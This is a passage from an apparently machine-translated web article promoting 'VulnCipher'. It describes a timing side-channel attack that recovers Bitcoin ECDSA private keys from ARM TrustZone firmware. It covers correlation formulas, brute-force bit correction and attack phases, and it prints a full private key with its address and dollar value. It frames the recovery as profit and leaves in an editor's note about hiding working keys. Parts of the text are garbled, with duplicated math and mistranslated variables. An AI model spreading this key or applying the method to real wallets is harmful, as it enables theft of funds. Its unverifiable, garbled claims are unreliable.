<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">D</font></font></mi></msub></mrow></semantics></math>tD — point doubling time (<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∼</mo><mn>3.2</mn><mtext> </mtext><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi>s</mi></mrow></semantics></math>∼3.2μs);</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">A</font></font></mi></msub></mrow></semantics></math>tA is the time of addition of a point (<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∼</font></font></mo><mn>5.8</mn><mtext> </mtext><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">s</font></font></mi></mrow></semantics></math>∼5.8μs);</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">ϵ</font></font></mi></mrow></semantics></math>ϵ — noise.</li>
</ul>



<h2 class="wp-block-heading">Step 5: Correlation Analysis</h2>



<p>For each bit<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi></mrow></semantics></math>k are considered:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mtext>Corr</mtext><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><msubsup><mi>H</mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mspace width="1em"></mspace><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">Corr</font></font></mtext><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo></mrow></semantics></math></p>



<p>and the bit is selected as:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mstyle mathcolor="#cc0000"><mtext>\*</mtext></mstyle></msubsup><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mi>arg</mi><mo>⁡</mo><munder><mrow><mi>max</mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">⁡</font></font></mo></mrow><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∈</font></font></mo><mo stretchy="false">{</mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo stretchy="false">}</mo></mrow></munder><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mi mathvariant="normal">.</mi></mrow></semantics></math></p>



<h2 class="wp-block-heading">Step 6: Trust assessment and error correction</h2>



<p>For the beat<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi></mrow></semantics></math>k:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mtext>Conf</mtext><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mfrac><mrow><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mstyle mathcolor="#cc0000"><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">\*</font></font></mtext></mstyle></msubsup><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mrow><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mstyle mathcolor="#cc0000"><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">\*</font></font></mtext></mstyle></msubsup></mrow><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi></mrow><mrow><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mstyle mathcolor="#cc0000"><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">\*</font></font></mtext></mstyle></msubsup><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">+</font></font></mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mrow><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mstyle mathcolor="#cc0000"><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">\*</font></font></mtext></mstyle></msubsup></mrow><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi></mrow></mfrac><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">.</font></font></mi></mrow></semantics></math></p>



<ul class="wp-block-list">
<li>If<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">Conf</font></font></mtext><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi></msub><mo>&lt;</mo><mn>0.55</mn></mrow></semantics></math>Confk&lt;0.55 — the bit is considered “unreliable”, we add it to the list of candidates for subsequent correction.</li>



<li>For a set of<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">and</font></font></mi></mrow></semantics></math>e such bits can be searched either exhaustively or limitedly (up to<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">and</font></font></mi></msup></mrow></semantics></math>2e options), checking each key against the public key and address.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-7.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7696"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">A practical example of recovery</h2>



<p>Let’s look at a documented case of&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key recovery:</a></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Parameter</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>Bitcoin address</strong></td><td><code><a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a></code></td></tr><tr><td><strong>Cost of recovered funds</strong></td><td><a href="https://cryptou.ru/vulncipher/profit">$188,775</a></td></tr><tr><td><strong>Recovered private key (HEX)</strong></td><td><code>F2E242938B92DA39A50AC0057D7DCFEDFDD58F7750BC06A72B11F1B821760A4A</code></td></tr><tr><td><strong>Recovered key (WIF compressed)</strong></td><td><code>L5MqyroFa1pcprty2vXc5xBJWdDfuicetxoQB4PZVMqQgqRVfnMB</code></td></tr><tr><td><strong>Public key (compressed)</strong></td><td><code>02658AC78A3526CFC47533E7C6C66DFA97E1C74EBCDA6B8F49C9EB4E2CC7A95710</code></td></tr></tbody></table></figure>



<p class="has-medium-font-size"><em>(You can remove/change some of the fields if you publish the case publicly, so as not to give out working keys.)</em></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher">Scientific significance of VulnCipher</h2>



<p><a href="https://vulncipher.ru/">VulnCipher</a> methodology has broad scientific implications:</p>



<ol class="wp-block-list">
<li><strong>Formal analysis of ECDSA/secp256k1 implementations</strong>&nbsp;at the runtime and microarchitectural levels.</li>



<li><strong>Quantifying information leakage</strong>&nbsp;through timing channels using statistical criteria and SNR metrics.</li>



<li><strong>An experimental platform</strong>&nbsp;for comparing implementations on different architectures (different MCUs, TrustZone, crypto accelerators).</li>



<li><strong>Instrumental confirmation of the importance of constant-time cryptography</strong>&nbsp;in real-world embedded scenarios.</li>



<li><strong>A basis for developing countermeasures</strong>&nbsp;, including:
<ul class="wp-block-list">
<li>algorithmic (Montgomery ladder, scalar/point blinding),</li>



<li>architectural (cache isolation, PMU control),</li>



<li>protocol (restrictions on access to the signature API).</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher">Types of vulnerabilities exploited by VulnCipher</h2>



<p>VulnCipher exploits the following main types of vulnerabilities:</p>



<ol class="wp-block-list">
<li><strong>Variable-Time Scalar Multiplication</strong><br>Varying number of operations&nbsp;<code>point_add</code>/&nbsp;<code>point_double</code>depending on the scalar bits.</li>



<li><strong>Branch Prediction Timing Leaks</strong><br>Branches that depend on secret data produce varying numbers of branch predictor misses.</li>



<li><strong>Cache-Based Side-Channels</strong><br>Differences in cache hit/miss access times for data and instructions.</li>



<li><strong>Modular Inversion Timing Leaks</strong><br>Modular inversion algorithms with variable iteration counts depend on the values ​​of the arguments.</li>



<li><strong>Power/EM Co-leaks (in conjunction with timing)</strong><br>In some configurations, timing measurements can be combined with power/EM measurements for increased accuracy.</li>



<li><strong>Microarchitectural Leaks (Spectre-like scenarios)</strong><br>Speculative execution and microscopic cache/pipeline behavior not accounted for in the firmware developers’ threat model.</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher">Key recovery process via VulnCipher</h2>



<p><a href="https://vulncipher.ru/">VulnCipher</a> detects and exploits these vulnerabilities by analyzing signatures and cryptographic data, using cryptanalysis techniques to recover private keys. The process includes:</p>



<ol class="wp-block-list">
<li>Collecting a large array of pairs (message, signature, time).</li>



<li>Normalization and filtering of timings.</li>



<li>Simulation of theoretical execution time for hypothetical key bit values.</li>



<li>Correlation analysis for each bit position.</li>



<li>Generating a&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key candidate.</a></li>



<li>Verification via public key and address.</li>



<li>If necessary, correction of several bits through limited brute force.</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-9.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7698"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher">How VulnCipher compares to traditional recovery methods</h2>



<p>Traditional methods of recovering/compromising&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;typically rely on:</p>



<ul class="wp-block-list">
<li>brute force;</li>



<li>analysis of mnemonic phrases (BIP-39);</li>



<li>physical hacking of hardware wallets (chip-off, fault injection);</li>



<li>social engineering and backup leaks.</li>
</ul>



<p><strong>VulnCipher is fundamentally different</strong>&nbsp;:</p>



<ul class="wp-block-list">
<li>it exploits&nbsp;<strong>the implementation vulnerability</strong>&nbsp;rather than the cryptographic strength of the algorithm;</li>



<li>attacks&nbsp;<strong>the leakage channel (time)</strong>&nbsp;rather than the cryptographic discrete logarithm problem;</li>



<li>allows you&nbsp;<strong>to recover the key significantly faster</strong>&nbsp;than any brute force on the entire space<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup></mrow></semantics></math>2256;</li>



<li>does not require knowledge of the seed phrase, backups, wallet.dat files, or social compromise of the owner.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">Real-world example: recovering the address key 1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</h2>



<h2 class="wp-block-heading">Initial data of compromise</h2>



<p>Let’s look at a documented case&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of recovering a private key</a>&nbsp;from a Bitcoin address&nbsp;<code><a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a></code>:</p>



<ul class="wp-block-list">
<li>Target: P2PKH address with a balance of about&nbsp;<a href="https://cryptou.ru/vulncipher/profit">$188,775;</a></li>



<li>Hardware platform: Nordic nRF5340 with TrustZone and TF‑M;</li>



<li>Cryptography implementation: PSA Crypto with a vulnerable ECDSA (variable-time scalar multiplication) modulus;</li>



<li>The attacker has access to the Normal World and can force the signature of arbitrary messages by measuring the execution time.</li>
</ul>



<p>Next, the VulnCipher algorithm described above is applied: collecting&nbsp;<a href="https://cryptou.ru/vulncipher/profit">~100k–1M</a>&nbsp;timings, performing bit-by-bit correlation analysis, generating a rough key, and correcting several questionable bits.</p>



<p>The result is&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the recovery of a private key</a>&nbsp;, public key, and address that match the target key. This demonstrates that, with an incorrect implementation of ECDSA/secp256k1,&nbsp;<strong>the scheme’s mathematical security does not prevent leakage through the architecture and implementation</strong>&nbsp;.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">3.1.2 Mathematical Analysis</h4>



<p>Suppose a recovered private key has an error in some bits. How difficult is it to find a corrected key?</p>



<p><strong>Problem statement:</strong></p>



<p>Given&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">a private key</a>&nbsp;$\tilde{d}$ with a known number of erroneous bits $e$, we need to find the correct key $d$ such that for any message $m$ and public key $Q = d \cdot G$:</p>



<p>$$\text{verify}(\text{sign}(m, d), Q) = \text{True}$$</p>



<p><strong>Solution:</strong></p>



<ol class="wp-block-list">
<li>If $e$ is small (for example, $e \leq 20$),&nbsp;<a href="https://cryptou.ru/vulncipher/attack">a brute-force attack can be used:</a></li>
</ol>



<ul class="wp-block-list">
<li>Complexity: $O(2^e)$ signature verification operations</li>



<li>For $e=20$: ~1 million checks performed in ~10 sec on a modern PC</li>
</ul>



<ol class="wp-block-list">
<li>Alternatively, use HMM (Hidden Markov Model):</li>
</ol>



<ul class="wp-block-list">
<li>Model as a probabilistic process</li>



<li>Decoding using the Viterbi algorithm</li>



<li>Complexity: $O(256 \cdot 2^2) = O(1024)$ operations for each bit</li>



<li>Total: $O(256K)$ to recover the key</li>
</ul>



<h4 class="wp-block-heading">3.1.3 Bitcoin Private Key Extraction Demonstration</h4>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">3.2 Attack Architecture</a></h3>



<p>Chronoforge Attack consists of three main phases:</p>



<p><strong>Phase 1: Profiling and Timing Data Collection</strong></p>



<ul class="wp-block-list">
<li>An attacker in the Normal World initiates a cycle of ECDSA signatures with controlled messages.</li>



<li>For each signature, the exact time of the transaction is recorded in Secure World</li>



<li>A statistically significant sample is collected (10,000 – 1,000,000 observations)</li>
</ul>



<p><strong>Phase 2: Statistical Analysis and Noise Reduction</strong></p>



<ul class="wp-block-list">
<li>Analysis of collected timing data to identify correlations</li>



<li>Applying machine learning (e.g., simple averaging, binning, FFT) to filter out noise</li>



<li>Constructing a “timing signature” for each state (private key bit)</li>
</ul>



<p><strong><a href="https://cryptou.ru/vulncipher/privatekey">Phase 3: Private Key Recovery</a></strong></p>



<ul class="wp-block-list">
<li>Using timing information to recover private key bits</li>



<li>Using dynamic programming or branching algorithms to find a consistent key</li>
</ul>



<h3 class="wp-block-heading">3.2 Detailed Implementation of Chronoforge Attack</h3>



<h4 class="wp-block-heading">3.2.1 Timing Data Collection</h4>



<p><strong>Critical points in timing data collection:</strong></p>



<ol class="wp-block-list">
<li><strong>Timer calibration:</strong>&nbsp;Use the built-in hardware timer (TIMER0-2 on nRF52), which provides an accuracy of ±5 ns</li>



<li><strong>Noise Elimination:</strong></li>
</ol>



<ul class="wp-block-list">
<li>Run each measurement multiple times and take the median</li>



<li>Use warm-up iterations to stabilize the cache state</li>



<li>Discard outliers (&gt;3σ)</li>
</ul>



<ol class="wp-block-list">
<li><strong>Collecting a sufficient sample:</strong></li>
</ol>



<ul class="wp-block-list">
